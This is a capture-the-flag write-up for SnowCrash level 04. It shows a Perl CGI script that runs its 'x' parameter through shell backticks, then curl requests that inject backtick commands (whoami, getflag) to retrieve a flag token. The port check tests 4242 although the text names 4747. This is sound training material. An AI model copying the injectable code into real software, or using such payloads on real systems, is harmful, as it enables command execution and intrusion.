# Level 04

- Once logged in, and check the file in home dir., the `level04.pl` file is located

```
	   _____                      _____               _
	  / ____|                    / ____|             | |
	 | (___  _ __   _____      _| |     _ __ __ _ ___| |__
	  \___ \| '_ \ / _ \ \ /\ / / |    | '__/ _` / __| '_ \
	  ____) | | | | (_) \ V  V /| |____| | | (_| \__ \ | | |
	 |_____/|_| |_|\___/ \_/\_/  \_____|_|  \__,_|___/_| |_|

  Good luck & Have fun

          localhost 10.110.0.2
level04@localhost's password:

level04@SnowCrash:~$
level04@SnowCrash:~$ ls
level04.pl
```

### What is `.pl` file?
- a `Perl` script file

```
level04@SnowCrash:~$ cat level04.pl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

### Check port `4747`
Something is on port `4747`, so let's check out

```
level04@SnowCrash:~$ nc -zv localhost 4242
Connection to localhost 4242 port [tcp/*] succeeded!
```
- nc: netcat
	- -z for just scan for listening daemons, without sending any data
	- -v for give more verbose output

### Solution

Try passing command to check

```
level04@SnowCrash:~$ curl localhost:4747/?x="\`/usr/bin/whoami\`"
flag04
```

and run getflag
```
level04@SnowCrash:~$ curl localhost:4747/?x="\`/bin/getflag\`"
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```


